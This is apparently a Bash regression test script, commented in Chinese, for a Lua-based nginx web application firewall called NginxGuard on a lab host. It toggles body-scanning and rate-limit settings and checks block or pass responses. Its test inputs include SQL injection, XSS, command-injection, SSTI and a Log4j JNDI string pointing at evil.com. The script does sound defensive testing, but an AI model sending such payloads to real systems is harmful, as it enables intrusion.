#!/bin/bash
# NginxGuard 回归测试 — 补充现有测试脚本未覆盖的功能点
# 测试目标: 192.168.2.180 (NginxGuard on port 80)
# 覆盖: bodyless on/off 切换、域名级 bodyless、cc_rate 无效配置、
#        日志字段截断、PUT/PATCH 方法行为、POST 大 body 拦截

TARGET="http://192.168.2.180"
SSH180="ssh 192.168.2.180"
NGINX_CMD="cd /opt/nginx && ./nginx -p /opt/nginx/ -c conf/nginx.conf"
WAF_CONFIG="/opt/nginx/lua/waf/config.lua"
WAF_LOG_DIR="/opt/nginx/log"
RULE_CACHE_WAIT=12
PASS=0; FAIL=0; TOTAL=0; ERRORS=""
RESULTS="/tmp/waf_regression_test.txt"
> $RESULTS
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

log()  { echo "[$(date '+%H:%M:%S')] $*" | tee -a $RESULTS; }
ok()   { echo -e "  ${GREEN}PASS${NC}  $1  (HTTP $2)" | tee -a $RESULTS; PASS=$((PASS+1)); TOTAL=$((TOTAL+1)); }
bad()  { echo -e "  ${RED}FAIL${NC}  $1  (got $2, want $3)" | tee -a $RESULTS; FAIL=$((FAIL+1)); TOTAL=$((TOTAL+1)); ERRORS="$ERRORS\n  $1: got $2, want $3"; }

test_rule() {
    local name="$1"; local expect="$2"; shift 2
    local actual=$(curl --globoff -s -m 10 -o /dev/null -w "%{http_code}" "$@" 2>/dev/null)
    if [ "$actual" = "$expect" ]; then ok "$name" "$actual"; else bad "$name" "$actual" "$expect"; fi
}
set_config() { $SSH180 "sed -i \"s|^config_$1 = .*|config_$1 = \\\"$2\\\"|\" $WAF_CONFIG"; }
restart_nginx() { $SSH180 "kill -TERM \$(cat /opt/nginx/logs/nginx.pid) 2>/dev/null; sleep 1; cd /opt/nginx && ./nginx -p /opt/nginx/ -c conf/nginx.conf 2>&1"; sleep 2; }
reload_nginx() { $SSH180 "$NGINX_CMD -s reload 2>&1"; sleep 3; }

echo "========================================" | tee -a $RESULTS
echo "  NginxGuard 回归测试" | tee -a $RESULTS
echo "  目标: $TARGET" | tee -a $RESULTS
echo "  时间: $(date '+%Y-%m-%d %H:%M:%S')" | tee -a $RESULTS
echo "  补充: bodyless/cc_rate无效/日志截断/PUT方法/大body" | tee -a $RESULTS
echo "========================================" | tee -a $RESULTS

# 预处理: 重启 + 关闭 CC
restart_nginx
set_config "cc_check" "off"
sleep 3
$SSH180 "$NGINX_CMD -s reload 2>&1"
sleep 2

# ============================================================
# 1. bodyless=on (默认): GET/HEAD/OPTIONS 跳过 body/post/file_upload
# ============================================================
echo -e "\n${CYAN}=== 1. bodyless=on (默认): GET 跳过 body 检测 ===${NC}" | tee -a $RESULTS
set_config "bodyless" "on"
sleep 3
reload_nginx

# GET 请求不应被 post_check 拦截 (即使带攻击 payload 在 body 中)
# GET 请求一般没有 body, 但如果有也不扫描
test_rule "GET bodyless=on: 正常GET放行" 200 -H "User-Agent: Mozilla/5.0" -X GET "$TARGET/"
test_rule "GET bodyless=on: 正常args放行" 200 -H "User-Agent: Mozilla/5.0" "$TARGET/?id=123"
# GET 带 URL 参数攻击仍应拦截 (url_check 不受 bodyless 影响)
test_rule "GET bodyless=on: URL SQLi仍拦截" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?id=1+union+select+1"

# HEAD 方法
test_rule "HEAD bodyless=on: 正常HEAD放行" 200 -H "User-Agent: Mozilla/5.0" -X HEAD "$TARGET/"
test_rule "HEAD bodyless=on: URL SQLi仍拦截" 403 -H "User-Agent: Mozilla/5.0" -X HEAD "$TARGET/?id=1+union+select+1"

# OPTIONS 方法 (nginx 静态 root 返回 405)
test_rule "OPTIONS bodyless=on: 放行(405)" 405 -H "User-Agent: Mozilla/5.0" -X OPTIONS "$TARGET/"

# ============================================================
# 2. bodyless=off: GET/HEAD/OPTIONS 也扫描 body
# ============================================================
echo -e "\n${CYAN}=== 2. bodyless=off: 强制全方法扫描 body ===${NC}" | tee -a $RESULTS
set_config "bodyless" "off"
sleep 3
reload_nginx

# bodyless=off 后, GET 请求仍能正常放行 (GET 没有 body)
test_rule "GET bodyless=off: 正常GET放行" 200 -H "User-Agent: Mozilla/5.0" -X GET "$TARGET/"
# URL 攻击仍拦截
test_rule "GET bodyless=off: URL SQLi仍拦截" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?id=1+union+select+1"

# PUT 方法 + 攻击 body (PUT 不是 bodyless, 无论 bodyless 配置都扫描)
test_rule "PUT + SQL body 拦截" 403 -X PUT -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/x-www-form-urlencoded" -d "id=1+union+select+1" "$TARGET/"

# PATCH 方法 + 攻击 body
test_rule "PATCH + SQL body 拦截" 403 -X PATCH -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/x-www-form-urlencoded" -d "id=1+union+select+1" "$TARGET/"

# DELETE 方法 + 攻击 body
test_rule "DELETE + SQL body 拦截" 403 -X DELETE -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/x-www-form-urlencoded" -d "id=1+union+select+1" "$TARGET/"

# POST 方法 (始终扫描)
test_rule "POST + SQL body 拦截" 403 -X POST -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/x-www-form-urlencoded" -d "id=1+union+select+1" "$TARGET/"

# 恢复 bodyless=on
set_config "bodyless" "on"
sleep 3
reload_nginx

# ============================================================
# 3. bodyless 域名级覆盖 (strict.example.com: bodyless=off)
# ============================================================
echo -e "\n${CYAN}=== 3. 域名级 bodyless 覆盖 ===${NC}" | tee -a $RESULTS

# strict.example.com 在 domain.json 中设了 bodyless=off
# 该域名的请求应对所有方法扫描 body
# 全局 bodyless=on, 但 strict.example.com 覆盖为 off

# strict.example.com + PUT + SQL body 应拦截
test_rule "strict.example.com PUT+SQL body 拦截" 403 -X PUT -H "Host: strict.example.com" -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/x-www-form-urlencoded" -d "id=1+union+select+1" "$TARGET/"

# strict.example.com + PATCH + SQL body 应拦截
test_rule "strict.example.com PATCH+SQL body 拦截" 403 -X PATCH -H "Host: strict.example.com" -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/x-www-form-urlencoded" -d "id=1+union+select+1" "$TARGET/"

# 对比: 全局域名 PUT + SQL body 也应拦截 (PUT 本来就不是 bodyless)
test_rule "全局 PUT+SQL body 拦截" 403 -X PUT -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/x-www-form-urlencoded" -d "id=1+union+select+1" "$TARGET/"

# ============================================================
# 4. cc_rate 无效配置: 应记录错误日志, CC 静默失效
# ============================================================
echo -e "\n${CYAN}=== 4. cc_rate 无效配置 ===${NC}" | tee -a $RESULTS

# 先清空 error.log 中的相关日志
$SSH180 "truncate -s 0 /opt/nginx/log/error.log 2>/dev/null || true"

set_config "cc_check" "on"
set_config "cc_rate" "invalid_rate"
sleep 3
reload_nginx

# 发送大量请求, 不应被 CC 拦截 (因为 cc_rate 无效, CC 检测静默失效)
CC_BLOCKED=0
for i in $(seq 1 30); do
    CODE=$(curl --globoff -s -m 3 -o /dev/null -w "%{http_code}" -H "User-Agent: Mozilla/5.0" "$TARGET/")
    [ "$CODE" = "403" ] && CC_BLOCKED=$((CC_BLOCKED+1))
done

if [ "$CC_BLOCKED" -eq 0 ]; then
    ok "无效cc_rate: CC静默失效(不拦截)" "0"
else
    bad "无效cc_rate: 仍有$CC_BLOCKED次拦截" "$CC_BLOCKED" "0"
fi

# 检查 error.log 中是否有错误日志
ERR_LOG=$($SSH180 "grep 'invalid cc_rate config' /opt/nginx/log/error.log 2>/dev/null | head -1")
if [ -n "$ERR_LOG" ]; then
    ok "无效cc_rate: error.log 记录了错误" "found"
else
    bad "无效cc_rate: error.log 未记录错误" "not found" "found"
fi

# 恢复 cc_rate
set_config "cc_rate" "150/60"
set_config "cc_check" "off"
sleep 3
reload_nginx

# ============================================================
# 5. 日志字段截断保护
# ============================================================
echo -e "\n${CYAN}=== 5. 日志字段截断保护 ===${NC}" | tee -a $RESULTS

# 确保有攻击日志 (先发一个攻击请求)
curl --globoff -s -m 5 -o /dev/null -H "User-Agent: Mozilla/5.0" "$TARGET/?id=1+union+select+1"

# 构造超长 URL 攻击 (超过 4096 字节)
LONG_PAYLOAD=$(python3 -c "print('a'*5000 + '+union+select')")
# 这个请求会被 URL 参数检测拦截 (包含 union select)
curl --globoff -s -m 10 -o /dev/null -H "User-Agent: Mozilla/5.0" "$TARGET/?id=${LONG_PAYLOAD}" 2>/dev/null

# 检查日志中 req_url 字段是否被截断
LOGFILE="$WAF_LOG_DIR/$(date +%Y-%m-%d)_waf.log"
TRUNC_CHECK=$($SSH180 "tail -1 $LOGFILE 2>/dev/null | python3 -c \"
import sys, json
line = sys.stdin.read().strip()
try:
    d = json.loads(line)
    url = d.get('req_url', '')
    if 'truncated' in url:
        print('truncated')
    elif len(url) > 5000:
        print('not_truncated')
    else:
        print('url_len=' + str(len(url)))
except:
    print('parse_error')
\"")

if [ "$TRUNC_CHECK" = "truncated" ]; then
    ok "日志截断: req_url 包含 truncated 标记" "$TRUNC_CHECK"
else
    # 可能是最后一条日志不是这个请求, 搜索最近几条
    TRUNC_CHECK2=$($SSH180 "grep 'truncated' $LOGFILE 2>/dev/null | tail -1 | head -c 20")
    if [ -n "$TRUNC_CHECK2" ]; then
        ok "日志截断: 找到 truncated 标记" "found"
    else
        bad "日志截断: 未找到 truncated 标记" "$TRUNC_CHECK" "truncated"
    fi
fi

# ============================================================
# 6. POST 大 body 超限拦截 (post_body_scan_limit)
# ============================================================
echo -e "\n${CYAN}=== 6. POST 大 body 超限拦截 ===${NC}" | tee -a $RESULTS

# 全局 post_body_scan_limit = 2097152 (2MB)
# 构造 2.5MB 的 JSON body, 应被拦截
python3 - <<'PY' >/tmp/nginxguard_large_body.json
import sys
payload = "a" * (2097152 + 1024)  # 2MB + 1KB
print('{"q":"' + payload + '"}')
PY

code=$(curl --globoff -s -m 15 -o /dev/null -w "%{http_code}" -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" --data-binary @/tmp/nginxguard_large_body.json "$TARGET/")
if [ "$code" = "403" ]; then
    ok "POST 大body超2MB被拦截(Deny_URL_POST_Oversize)" "$code"
else
    bad "POST 大body超2MB未拦截" "$code" "403"
fi

# 构造 1MB 的正常 JSON body, 不应被拦截 (未超限)
python3 - <<'PY' >/tmp/nginxguard_normal_body.json
payload = "a" * 1048576  # 1MB
print('{"q":"' + payload + '"}')
PY

code=$(curl --globoff -s -m 15 -o /dev/null -w "%{http_code}" -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" --data-binary @/tmp/nginxguard_normal_body.json "$TARGET/")
# nginx 静态 root 对 POST 返回 405, WAF 不拦截
if [ "$code" != "403" ]; then
    ok "POST 1MB body 未超限放行" "$code"
else
    bad "POST 1MB body 被误拦截" "$code" "non-403"
fi

# ============================================================
# 7. config_bodyless 动态切换 (不重启, 只 reload)
# ============================================================
echo -e "\n${CYAN}=== 7. bodyless 动态切换 ===${NC}" | tee -a $RESULTS

# bodyless=on → GET 放行 (没有 body)
set_config "bodyless" "on"
sleep 3
reload_nginx
test_rule "bodyless=on: GET放行" 200 -H "User-Agent: Mozilla/5.0" -X GET "$TARGET/"

# 切换为 off
set_config "bodyless" "off"
sleep 3
reload_nginx
test_rule "bodyless=off: GET放行(无body)" 200 -H "User-Agent: Mozilla/5.0" -X GET "$TARGET/"

# 切回 on
set_config "bodyless" "on"
sleep 3
reload_nginx
test_rule "bodyless恢复on: GET放行" 200 -H "User-Agent: Mozilla/5.0" -X GET "$TARGET/"

# ============================================================
# 8. POST JSON body 攻击 (补充)
# ============================================================
echo -e "\n${CYAN}=== 8. POST JSON body 攻击 ===${NC}" | tee -a $RESULTS
test_rule "JSON XSS script" 403 -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" -d '{"q":"<script>alert(1)</script>"}' "$TARGET/"
test_rule "JSON SQL union" 403 -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" -d '{"id":"1 union select 1"}' "$TARGET/"
test_rule "JSON system()" 403 -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" -d '{"cmd":"system(ls)"}' "$TARGET/"
test_rule "JSON Log4j" 403 -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" -d '{"q":"${jndi:ldap://evil.com}"}' "$TARGET/"
test_rule "JSON SSTI" 403 -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" -d '{"x":"{{__class__}}"}' "$TARGET/"

# ============================================================
# 9. 正常请求不误报 (回归)
# ============================================================
echo -e "\n${CYAN}=== 9. 正常请求不误报 ===${NC}" | tee -a $RESULTS
test_rule "Normal: hello world" 200 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=hello+world"
test_rule "Normal: page param" 200 -H "User-Agent: Mozilla/5.0" "$TARGET/?page=1&size=20"
test_rule "Normal: email format" 200 -H "User-Agent: Mozilla/5.0" "$TARGET/?email=test@example.com"
test_rule "Normal: date param" 200 -H "User-Agent: Mozilla/5.0" "$TARGET/?date=2026-08-20"
test_rule "Normal: search" 200 -H "User-Agent: Mozilla/5.0" "$TARGET/?search=hello+world+test"
test_rule "Normal: Chrome UA" 200 -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0" "$TARGET/"
test_rule "Normal: Mobile UA" 200 -A "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)" "$TARGET/"

# ============================================================
# 后处理: 恢复配置
# ============================================================
echo -e "\n${CYAN}=== 后处理: 恢复配置 ===${NC}" | tee -a $RESULTS
set_config "cc_check" "on"
set_config "cc_rate" "150/60"
set_config "bodyless" "on"
restart_nginx
log "配置已恢复, nginx 已重启"

# 汇总
echo "" | tee -a $RESULTS
echo "========================================" | tee -a $RESULTS
echo "  回归测试汇总" | tee -a $RESULTS
echo "  PASS: $PASS  FAIL: $FAIL  TOTAL: $TOTAL" | tee -a $RESULTS
echo "  时间: $(date)" | tee -a $RESULTS
echo "========================================" | tee -a $RESULTS
if [ $FAIL -gt 0 ]; then
    echo -e "失败项:$ERRORS" | tee -a $RESULTS
fi
echo ""
echo "Results saved to $RESULTS"
